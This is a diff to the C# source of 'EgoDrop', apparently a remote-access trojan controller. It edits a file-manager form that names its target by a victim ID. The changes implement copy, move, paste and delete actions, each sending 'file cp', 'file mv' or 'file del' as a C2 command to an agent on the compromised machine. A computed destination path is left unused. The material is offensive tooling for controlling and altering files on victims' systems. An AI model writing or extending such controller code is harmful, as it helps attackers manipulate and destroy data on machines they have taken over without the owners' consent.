@@ -17,14 +17,14 @@ namespace EgoDrop
         public string m_szVictimID { get; init; }
 
         private string m_szInitDir { get; set; }
-        private string m_szCurrentPath { get { return (string)textBox1.Tag; } }
+        private string m_szCurrentPath { get { return textBox1.Tag == null ? "." : (string)textBox1.Tag; } }
 
         private bool m_bIsUnixLike { get; set; }
         private bool m_bIsWindows { get { return !m_bIsUnixLike; } }
 
         private string[] m_asWinShortCutDir =
         {
-
+            "%username%/Desktop",
         };
         private string[] m_asLinuxShortCutDir =
         {
@@ -37,7 +37,7 @@ namespace EgoDrop
         /// File information struct.
         /// Store the file information of remote file.
         /// </summary>
-        private struct stFileInfo
+        public struct stFileInfo
         {
             public bool bDirectory { get; set; }                                              //Is directory.
             public string szFilePath { get; set; }                                            //File path.
@@ -94,6 +94,11 @@ namespace EgoDrop
             Text = $"FileMgr[{m_szVictimID}] | {(m_bIsUnixLike ? "Linux-like" : "Windows")}";
         }
 
+        /// <summary>
+        /// Get file information struct from ListViewItem tag.
+        /// </summary>
+        /// <param name="item"></param>
+        /// <returns></returns>
         private stFileInfo fnGetFileInfo(ListViewItem item) => item.Tag == null ? new stFileInfo() : (stFileInfo)item.Tag;
 
         /// <summary>
@@ -380,7 +385,7 @@ namespace EgoDrop
             string drive = parts[0];
             string relativePath = string.Join("\\", parts.Skip(1));
 
-            TreeNode driveNode = null;
+            TreeNode? driveNode = null;
 
             foreach (TreeNode t in treeView1.Nodes)
             {
@@ -429,7 +434,7 @@ namespace EgoDrop
 
                     szRelativePath = szRelativePath.Trim('/');
 
-                    TreeNode tnNode = null;
+                    TreeNode? tnNode = null;
                     string[] split = szRelativePath.Split('/');
 
                     foreach (TreeNode t in node.Nodes)
@@ -574,7 +579,7 @@ namespace EgoDrop
         /// Set file clipboard.
         /// </summary>
         /// <param name="lsInfo">Entity list.</param>
-        private void fnSetClipboard(List<stFileInfo> lsInfo)
+        private void fnSetClipboard(List<stFileInfo> lsInfo, bool bMove)
         {
             TreeNode nodeFolders;
             TreeNode nodeFiles;
@@ -583,12 +588,16 @@ namespace EgoDrop
             {
                 nodeFolders = new TreeNode("Folder");
                 nodeFiles = new TreeNode("File");
+
+                treeView2.Nodes.AddRange(new TreeNode[] { nodeFolders, nodeFiles });
             }
             else
             {
                 nodeFolders = treeView2.Nodes[0];
-                nodeFiles = treeView2 .Nodes[1];
+                nodeFiles = treeView2.Nodes[1];
             }
+
+            treeView2.Tag = bMove;
 
             nodeFolders.Nodes.Clear();
             nodeFiles.Nodes.Clear();
@@ -601,18 +610,20 @@ namespace EgoDrop
                     Tag = info,
                 });
             }
+
+            treeView2.ExpandAll();
         }
 
         /// <summary>
         /// Get entity list from clipboard.
         /// </summary>
         /// <returns></returns>
-        private List<stFileInfo> fnGetClipboard()
+        private (List<stFileInfo> lsFile, bool bMove) fnGetClipboard()
         {
             if (treeView2.Nodes.Count == 0)
             {
                 MessageBox.Show("Initialization error.", "fnGetClipboard()", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                return new List<stFileInfo>();
+                return (new List<stFileInfo>(), false);
             }
 
             TreeNode nodeFolders = treeView2.Nodes[0];
@@ -622,49 +633,94 @@ namespace EgoDrop
                 .Concat(nodeFiles.Nodes.Cast<TreeNode>())
                 .Select(x => (stFileInfo)x.Tag).ToList();
 
-            return lsInfo;
+            if (treeView2.Tag == null)
+                treeView2.Tag = false;
+
+            return (lsInfo, (bool)treeView2.Tag);
         }
 
         /// <summary>
-        /// 
+        /// Send C2 command: Copy.
         /// </summary>
         /// <param name="szSrcEntity"></param>
         /// <param name="szDstEntity"></param>
         /// <param name="bIsDir"></param>
         public void fnCopy(string szSrcEntity, string szDstEntity, bool bIsDir)
         {
+            if (bIsDir)
+            {
+                if (szSrcEntity[szSrcEntity.Length - 1] != '/')
+                    szSrcEntity += "/";
 
+                if (szDstEntity[szDstEntity.Length - 1] != '/')
+                    szDstEntity += "/";
+            }
+
+            m_agent.fnSendCommand(new string[]
+            {
+                "file",
+                "cp",
+                szSrcEntity,
+                szDstEntity,
+            });
         }
 
         /// <summary>
-        /// 
+        /// Send C2 command: Copy.
         /// </summary>
         /// <param name="lsInfo"></param>
         /// <param name="szDstDir"></param>
         private void fnCopy(List<stFileInfo> lsInfo, string szDstDir)
         {
+            foreach (var info in lsInfo)
+            {
+                string szSrcPath = info.szFilePath;
+                string szDstPath = Path.Combine(szDstDir, Path.GetFileName(szSrcPath)).Replace("\\", "/");
 
+                fnCopy(szSrcPath, szDstDir, info.bDirectory);
+            }
         }
 
         /// <summary>
-        /// 
+        /// Send C2 command: Move.
         /// </summary>
         /// <param name="szSrcEntity"></param>
         /// <param name="szDstEntity"></param>
         /// <param name="bIsDir"></param>
         public void fnMove(string szSrcEntity, string szDstEntity, bool bIsDir)
         {
+            if (bIsDir)
+            {
+                if (szSrcEntity[szSrcEntity.Length - 1] != '/')
+                    szSrcEntity += "/";
 
+                if (szDstEntity[szDstEntity.Length - 1] != '/')
+                    szDstEntity += "/";
+            }
+
+            m_agent.fnSendCommand(new string[]
+            {
+                "file",
+                "mv",
+                szSrcEntity,
+                szDstEntity,
+            });
         }
 
         /// <summary>
-        /// 
+        /// Send C2 command: Move.
         /// </summary>
         /// <param name="lsInfo"></param>
         /// <param name="szDstDir"></param>
         private void fnMove(List<stFileInfo> lsInfo, string szDstDir)
         {
+            foreach (var info in lsInfo)
+            {
+                string szSrcPath = info.szFilePath;
+                string szDstPath = Path.Combine(szDstDir, Path.GetFileName(szSrcPath)).Replace("\\", "/");
 
+                fnMove(szSrcPath, szDstDir, info.bDirectory);
+            }
         }
 
         /// <summary>
@@ -674,7 +730,15 @@ namespace EgoDrop
         /// <param name="bIsDir">Is directory?</param>
         public void fnDelete(string szPath, bool bIsDir)
         {
+            if (bIsDir)
+                szPath = $"{szPath}/";
 
+            m_agent.fnSendCommand(new string[]
+            {
+                "file",
+                "del",
+                szPath,
+            });
         }
 
         /// <summary>
@@ -683,14 +747,17 @@ namespace EgoDrop
         /// <param name="lsInfo"></param>
         private void fnDelete(List<stFileInfo> lsInfo)
         {
-
+            foreach (stFileInfo file in lsInfo)
+            {
+                fnDelete(file.szFilePath, file.bDirectory);
+            }
         }
 
         #endregion
 
         private void fnSetup()
         {
-            fnSetClipboard(new List<stFileInfo>());
+            fnSetClipboard(new List<stFileInfo>(), false);
 
             m_victim.fnSendCommand(m_szVictimID, "file|init");
             m_victim.m_listener.evtReceivedMessage += fnRecvMsg;
@@ -706,7 +773,7 @@ namespace EgoDrop
             m_victim.m_listener.evtReceivedMessage -= fnRecvMsg;
         }
 
-        private async void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
+        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
         {
             string szPath = treeView1.SelectedNode.FullPath.Replace("\\", "/").Replace("//", "/");
             m_victim.fnSendCommand(m_szVictimID, "file|sd|" + szPath);
@@ -867,25 +934,41 @@ namespace EgoDrop
         //Copy
         private void toolStripMenuItem5_Click(object sender, EventArgs e)
         {
+            List<stFileInfo> lsInfo = listView1.SelectedItems.Cast<ListViewItem>().Select(x => fnGetFileInfo(x)).ToList();
+            if (lsInfo.Count == 0)
+                return;
 
+            fnSetClipboard(lsInfo, false);
         }
 
         //Move
         private void toolStripMenuItem6_Click(object sender, EventArgs e)
         {
+            List<stFileInfo> lsInfo = listView1.SelectedItems.Cast<ListViewItem>().Select(x => fnGetFileInfo(x)).ToList();
+            if (lsInfo.Count == 0)
+                return;
 
+            fnSetClipboard(lsInfo, true);
         }
 
         //Paste
         private void toolStripMenuItem7_Click(object sender, EventArgs e)
         {
-
+            var clipboard = fnGetClipboard();
+            if (clipboard.bMove)
+                fnMove(clipboard.lsFile, m_szCurrentPath);
+            else
+                fnCopy(clipboard.lsFile, m_szCurrentPath);
         }
 
         //Delete
         private void toolStripMenuItem4_Click(object sender, EventArgs e)
         {
+            List<stFileInfo> lsInfo = listView1.SelectedItems.Cast<ListViewItem>().Select(x => fnGetFileInfo(x)).ToList();
+            if (lsInfo.Count == 0)
+                return;
 
+            fnDelete(lsInfo);
         }
 
         //Upload
@@ -937,12 +1020,20 @@ namespace EgoDrop
         //Archive.Compress
         private void toolStripMenuItem17_Click(object sender, EventArgs e)
         {
+            List<stFileInfo> lsFile = listView1.SelectedItems.Cast<ListViewItem>().Select(x => fnGetFileInfo(x)).ToList();
+            if (lsFile.Count == 0)
+                return;
+
 
         }
 
         //Archive.Decompress
         private void toolStripMenuItem18_Click(object sender, EventArgs e)
         {
+            List<stFileInfo> lsFile = listView1.SelectedItems.Cast<ListViewItem>().Select(x => fnGetFileInfo(x)).ToList();
+            if (lsFile.Count == 0)
+                return;
+
 
         }
 
@@ -985,6 +1076,11 @@ namespace EgoDrop
             {
                 f.BringToFront();
             }
+        }
+
+        private void toolStripMenuItem22_Click(object sender, EventArgs e)
+        {
+            new frmHelper("Function\\File").Show();
         }
     }
 }
